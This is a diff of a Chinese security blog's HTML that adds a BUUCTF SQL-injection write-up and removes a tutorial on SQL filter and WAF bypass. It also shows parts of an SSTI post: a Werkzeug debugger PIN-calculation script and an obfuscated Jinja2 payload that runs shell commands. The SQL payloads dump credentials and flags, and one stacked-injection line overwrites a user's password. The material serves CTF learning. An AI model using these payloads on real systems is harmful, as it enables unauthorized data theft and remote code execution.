@@ -273,6 +273,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/hearder.jpg">
+      <meta itemprop="name" content="？？喵！！">
+      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="睡猫的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/23/buu%E5%88%B7%E9%A2%98%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">buu刷题之sql注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-05-23 19:55:27 / 修改时间：22:02:21" itemprop="dateCreated datePublished" datetime="2023-05-23T19:55:27+08:00">2023-05-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/BuuCTF%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">BuuCTF刷题</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>经过一段时间的学习,开始刷题之旅,题目都来自<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF平台</a><br>大致分为<code>简单</code>,<code>签到</code>,<code>中等</code>三个等级(困难的还做不出~~~),每道题写个<code>wp</code></p>
+<h1 id="简单难度"><a href="#简单难度" class="headerlink" title="简单难度"></a>简单难度</h1><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201418.png"><br>进入靶机很容易发现是SQL注入<br>两个传参为<code>?username&amp;password</code><br>尝试丢单引号,发现报错,确定为注入点<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523201708.png"><br>丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>爆出3列<br>常规union注入,发现有回显!<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523202045.png"><br>无过滤,有回显,直接走流程<br><strong>pyload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span>admin<span class="string">&#x27;union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523205904.png"><br>进入靶机,提示有过滤<br>丢单引号,尝试丢单引号,发现报错,确定为注入点,丢个%23(#)进去,报错消失,证明为单引号闭合<br>常规<code>group by</code>发现报错<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210205.png"><br>提示表明错误发生在<code>3#</code>附近,猜测是<code>by</code>被替换为空了,尝试双写绕过,成功!(3列)<br>这边心急直接丢进去查表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
+<p><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523210905.png"><br>这个报错非常明显了,也是替换成空格,对比payload和报错信息,少掉的部分就是被过滤的<br>过滤的关键词有<code>union</code>,<code>select</code>,<code>from</code>,<code>or</code>,<code>where</code>,<code>from</code>,<code>and</code><br>其他非常常规的走流程<br><strong>payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="string">&#x27;uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>和前两题是一样的,找到注入点,判断单引号闭合<br>丢入<code>group by 3</code>时,提示<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230523212047.png"><br>明显是有东西触发过滤了(被发现了)<br>尝试写成<code>group b</code>,还是不行<br>尝试写成<code>grou b</code>,还是不行<br>单传一个空格,发现还是被逮住了,看来是过滤了空格,那我们直接<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87">上连接</a><br>找到一个<code>%A0</code>可以代替空格且没有过滤!<br>那尝试union注入,结果发现,union被过滤了…<br>那就直接上报错注入(无空格版)<br><code>and(1=extractvalue(100,concat(0x7e,(插入以下语句))))</code><br>还是被逮住,可能是and被过滤,删掉and,还是被逮住,可能是<code>=</code>被过滤<br>感觉出题人故意留了个后面一样…..<code>or</code>没有被过滤,其实想想也可以知道,要是<code>or</code>被过滤了,那<code>information_schema</code>也用不了<br>那就<code>?username=admin&amp;password=admin&#39;or(extractvalue(100,concat(0x7e,(database()))))%23</code>成功爆出<br>上payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or(extractvalue(100,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))))))%23</span></span><br></pre></td></tr></table></figure>
+<p>这里要知道<code>a=b</code>可以用<code>(a)like(b)</code>绕过<br>前面都还常规,逐渐报表名,爆列名,到最后一步<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)))))%23</code><br>得到<code>~1flagflag&#123;1669770e-dd70-4617-9f</code>,flag出来了一半,因为报错注入的字数是有限制的<br>尝试使用<br><code>select(substring(group_concat(password),1,30))from(H4rDsq1)</code><br>居然还是被逮住了,看来是过滤了<code>substring</code>,那就<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#substring%E8%BF%87%E6%BB%A4">上链接</a><br>使用<code>right</code>代替<code>substring</code><br>另一半flag出来的payload:<br><code>&#39;or(extractvalue(100,concat(0x7e,(select(right(password,30))from(H4rDsq1)))))%23</code></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/09/SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -304,7 +397,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-20 22:20:48" itemprop="dateModified" datetime="2023-05-20T22:20:48+08:00">2023-05-20</time>
+                <time title="修改时间：2023-05-21 10:11:05" itemprop="dateModified" datetime="2023-05-21T10:11:05+08:00">2023-05-21</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -472,7 +565,7 @@
 <p>在程序报错后,会在浏览器中提供一个交互调试器提示输入pin码,输入正确的pin码后可以实现命令的交互,并且,pin码并不是随机生成的,而是根据一些参数计算出来的<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230519204426.png"></p>
 <p>贴一个大佬的脚本计算pin码,其实原理就是,将原本计算pin码的过程复制下来,然后各个值自己控制</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># 参数一username,在ect/passwd可以看到</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 参数二modname,默认为flask.app</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 参数三getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)),默认为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 参数四getattr(mod, &#x27;__file__&#x27;, None),要获取app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377864455&#x27;</span>,  <span class="comment"># 参数五str(uuid.getnode()), 在/sys/class/net/ens33/address可以看到(需要转化十进制),一般为eth0</span></span><br><span class="line">    <span class="string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span>  <span class="comment"># 参数六get_machine_id(), 根据操作系统不同而不同,linux的是在/etc/machine-id可以看到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()  <span class="comment">#这里根据python的版本不同也不同,2.7版本用的是sha1(),将这里的md5()改成sha1</span></span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
-<p><strong>注意!!!!!!!!</strong><br>使用这个脚本还需要注意一些其他问题,比如我们需要有文件包含漏洞,或是能ssti出一些内容,因为我们需要去各个路径下读取参数<br>由于第六个参数比较复杂,就先不详细介绍了,参数五根据操作系统也有变化,参数四有默认值<br><code>print(int(&#39;mc地址&#39;,16))</code>参数五的转化代码,把mac地址的<code>:</code>删了</p>
+<p><strong>注意!!!!!!!!</strong><br>使用这个脚本还需要注意一些其他问题,比如我们需要有文件包含漏洞,或是能ssti出一些内容,因为我们需要去各个路径下读取参数<br>由于第六个参数比较复杂,就先不详细介绍了,参数五根据操作系统也有变化,参数四有默认值<br><code>print(int(&#39;mc地址&#39;,16))</code>参数五的转化代码,把mac地址的<code>:</code>删了<br><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">参考1</a>,<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11036">参考2</a>,<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44214568/article/details/124125565">参考3</a></p>
 <h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象,偶尔偶尔用的上吧,有时候用不上也不知道什么原因,可能是payload中的某些被过滤了</p>
 <p>过滤了<code>下划线_</code>,<code>空格</code>,<code>单引号&#39;&#39;和双引号&quot;&quot;</code>,<code>数字</code>,<code>某些关键字</code>,<code>中括号[]</code>,<code>小数点.</code>,<code>\</code><br>可以考虑试一下下面这个payload,基本很难cat,因为小数点被过滤了比如<code>flag.txt</code>就cat不了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eighteen=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ge=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glo)|attr(ge)(o)|attr(pope)(sys)|attr(rea)()&#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -1519,212 +1612,6 @@ a.jpg是一个正常的图片,shell.php是一句话木马,c.jpg是合成以后�
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/hearder.jpg">
-      <meta itemprop="name" content="？？喵！！">
-      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="睡猫的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/" class="post-title-link" itemprop="url">SQL注入2.0</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-31 14:56:19" itemprop="dateCreated datePublished" datetime="2023-03-31T14:56:19+08:00">2023-03-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-03 16:51:58" itemprop="dateModified" datetime="2023-05-03T16:51:58+08:00">2023-05-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>6.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>24 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h1><ol start="0">
-<li><p><strong>过滤原理</strong><br>经过前段时间的学习,已经可以通过一些方法去查询想要的数据,但一些网站会对一些关键字符进行过滤,也就是说输入进去的字符没法正常的进入到查询语句里.例如<code>preg_replace(参数1,参数2,参数3)</code>函数,会将参数三进行检测,如果发现参数1,则替换为参数2,而对关键字符进行替换删除</p>
-</li>
-<li><p><strong>绕过原理</strong><br>将被绕过的字符换成另一种表达方式,从而实现绕过过滤</p>
-</li>
-<li><p><strong>如何判断页面过滤对象</strong><br>从简单的注入语句开始,一步步增加复杂性,通过此方法判断过滤对象</p>
-</li>
-</ol>
-<h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><ol start="0">
-<li><p><strong>常见的注释</strong><br><code>--+</code> <code>#</code> <code>%23</code>建议先尝试这三种,都失效了再尝试其他<br>url里好像不能直接用<code>#</code>,要使用<code>%23</code></p>
-</li>
-<li><p><strong>绕过手法</strong><br><code>,&#39;3</code>最后一个单引号实现闭合,<code>3</code>可以换成任意数字,这种适用于union查询<br>可以将查询写成这样的形式<br><code>union select 1,(查询语句),3,4&#39;</code><br>这样一来最后的数字可以带一个单引号实现闭合</p>
-<p>注释符失效的情况下,可以参考注入编码的方式,用类似于<code>and &#39;1&#39; =&#39;1</code>(或者<code>or &#39;1&#39;=&#39;1</code>)这样的语句对后面的内容实现闭合<br>注意:这种方式闭合可能导致<code>order by</code>,<code>group by</code>失效,原因暂时未知</p>
-</li>
-</ol>
-<h2 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h2><ol>
-<li><strong>绕过手法</strong><ol>
-<li>使用大小写绕过<br>因为SQL语句不区分大小写,可以故意写错成类似于<code>AnD,anD,oR</code>这样的形式来绕过过滤检测</li>
-<li>复写过滤字符<br>如果过滤的方式是检测到关键字符就删除,可以采用复写的方式绕过<code>anandd</code>,将关键词删除后又成为了关键词</li>
-<li>用符号代替<br>可以用<code>&amp;&amp;</code>代替<code>and</code>,用<code>||</code>代替<code>or</code>,但是用get提交可能会失效,要使用URL编码(<code>%26=$</code>)(<code>%7C=|</code>)</li>
-<li>注意<br>如果语句过滤了and和or,单词里的也会收到影响(复写一下),如inf<strong>or</strong>mation</li>
-</ol>
-</li>
-</ol>
-<h2 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h2><ol>
-<li>等于号被过滤了可以采用<code>like</code>进行绕过,如果空格也被过滤了,可以在两边加上扩号</li>
-</ol>
-<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ol>
-<li>使用<code>+</code>,<code>%20</code>号代替空格</li>
-<li>使用URL编码绕过空格<br> <code>\**\</code> <code>%09</code>  <code>%0A</code>  <code>%0B</code>  <code>%0C</code>  <code>%0D</code>  <code>%A0</code><br> <img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230331163940.png"></li>
-<li>使用报错注入<br>原因:报错注入语法里没有空格,查询语句中的空格全部用<strong>括号</strong>代替<br><code>and 1=extractvalue(100,concat(0x7e,(插入以下语句)))</code><br>查表名:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (group_concat(table_name)) <span class="keyword">from</span> (information_schema.tables) <span class="keyword">where</span> (table_schema<span class="operator">=</span>database())</span><br></pre></td></tr></table></figure>
-查列名:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (group_concat(column_name)) <span class="keyword">from</span> (information_schema.columns) <span class="keyword">where</span> (table_schema<span class="operator">=</span>database()) <span class="keyword">and</span> (table_name<span class="operator">=</span><span class="string">&#x27;上一步爆破出来的表名&#x27;</span>)</span><br></pre></td></tr></table></figure>
-查数据:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>)) <span class="keyword">from</span> (爆破出来的表名)</span><br></pre></td></tr></table></figure>
-
-显示不全用下面这个<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="built_in">substring</span>( group_concat(爆破字段<span class="number">1</span>,爆破字段<span class="number">2</span>),<span class="number">1</span>,<span class="number">30</span>)) <span class="keyword">from</span> (爆破出的表名)</span><br></pre></td></tr></table></figure></li>
-<li>注意:sqli-libs第26关同时过滤了<strong>注释符</strong>,<strong>and和or</strong>,<strong>空格</strong>,要结合以上方法来做</li>
-</ol>
-<h2 id="substring过滤"><a href="#substring过滤" class="headerlink" title="substring过滤"></a>substring过滤</h2><ol>
-<li><code>right(字段,位数)</code>从位数开始向右显示<br><code>left(字段,位数)</code>从位数开始向左显示<br>例:<code>select (right(爆破字段1,30)) from (爆破出的表名)</code><br>从第三十个开始向左显示</li>
-</ol>
-<h2 id="union和select过滤"><a href="#union和select过滤" class="headerlink" title="union和select过滤"></a>union和select过滤</h2><p>其实思路和<strong>and和or</strong>过滤差不多,利用大小写组合,复写,等方式绕过</p>
-<h2 id="逗号过滤Join绕过"><a href="#逗号过滤Join绕过" class="headerlink" title="逗号过滤Join绕过"></a>逗号过滤Join绕过</h2><p>一般用到逗号的地方只有<code>union select 1,2,3</code>(列数必须一致),还有<code>select group_concat(爆破字段1,爆破字段2) from 爆破出来的表名</code></p>
-<ol>
-<li>爆破字段可以分开查询</li>
-<li>union列数必须保持一致,这时候利用join<br><code>union select 1,2,3</code>&#x3D;<code>union select * from (select 1)a join (select 2)b join (select 3)c</code><br>注意:a,b,c是取得别名,将查询语句写入括号内,用jion关联</li>
-</ol>
-<h2 id="char-函数"><a href="#char-函数" class="headerlink" title="char()函数"></a>char()函数</h2><p>可以将函数内的十进制数字转化为ascii编码对应字符<br>如char(117,115,101,114,115)&#x3D;’users’<br>在爆破字段名时可以绕过引号</p>
-<h2 id="addslashes过滤宽字节绕过"><a href="#addslashes过滤宽字节绕过" class="headerlink" title="addslashes过滤宽字节绕过"></a>addslashes过滤宽字节绕过</h2><ol>
-<li><code>adddslashes()</code>函数<br>可以在输入的预定义字符(单引号<code>&#39;</code>  双引号<code>&quot;</code>  反斜线<code>\</code>  <code>NULL</code>字符)前自动添加转义字符<code>\</code>,这样一来,注入语句中的符号就会被转义成这个字符本身,无法构成闭合</li>
-<li><strong>条件</strong>:<br>想要使用宽字节绕过,必须采用的是GBK编码</li>
-<li><strong>原理</strong>:<br>在预定义字符前加上<code>%df</code>,这样一来<code>%df</code>会和自动添加的<code>\</code>组合,被识别成SQL无法理解的汉字,从而使<code>\</code>失去转义功能</li>
-<li><strong>使用汉字</strong><br>有些汉字是三个字节的编码,代替<code>%df</code>时,可以前两个字节为一组,后两个字节为一组,从而过滤掉反斜杆,例如<code>汉&#39; or 1=1 #</code></li>
-</ol>
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ol>
-<li><strong>原理</strong><br>在一些情况下,使用了addslashes()等函数对用户输入的特殊字符进行了转义,但是对于这些数据,在写入到数据库时,还是保留了原来的数据,在保存到数据库的数据,就被认为是可信的,再下一次需要查询时,没有再次进行检验,就会造成二次注入.<br>大多出现在一些需要注册和登入的情况下</li>
-<li><strong>流程</strong><ol>
-<li>需要构造含有转义字符的恶意查询语句</li>
-<li>需有一处可以进行恶意数据的插入(比如注册)</li>
-<li>需要另一处引用了这个数据的操作(比如登入)<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230413180315.png"></li>
-</ol>
-</li>
-</ol>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ol>
-<li><strong>原理</strong><br><code>mysql_multi_query()</code>函数执行一个或多个数据库的查询,其中用逗号进行分割.如果代码中用到这个函数,很有可能产生堆叠注入,所谓的堆叠注入,其实就是一堆sql语句一起注入执行,这对安全的危害是十分巨大的,如果产生堆叠注入,用户可能可以通过语句对数据的数据进行修改,增加,甚至删除</li>
-<li>写法<code>id = 1&#39;;update users set password=123 where id=1 ;</code>  查询id&#x3D;1的数据,并将users表里的id&#x3D;1的用户密码修改成123</li>
-</ol>
-<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><p>在已经确定有waf(防火墙)的情况下,不要一步输入所有指令,而是一步步添加,发现哪个指令被拦截,就绕过哪个指令<br>一般有以下几种情况</p>
-<ol>
-<li>某个特殊字符后面不能接一些字符,否则报错</li>
-<li>几个特殊字符后面不能接一些字符,否则报错</li>
-<li>不能出现一些特殊字符,否则报错</li>
-</ol>
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ol start="0">
-<li><strong>原理</strong>:<br>某个特殊字符后面不能接一些字符,否则报错,如<code>select</code>和<code>union</code>,这两个放在一起会被过滤,这时候在中间插入注释符混淆,如<code>/*!90000 */</code>,让防火墙误以为里面内容也是要执行,实际上在mysql里会被注释,从而实现绕过</li>
-<li><code>--+</code>,<code>#</code></li>
-<li><code>/*  */</code><br>在sql里,<code>/* */</code>里的内容将会被注释,不做执行</li>
-<li><code>/*! */</code><br>这是mysql的扩张解释,如果在前面的星号后面加上感叹号<code>!</code>,那么注释里的内容又会被执行</li>
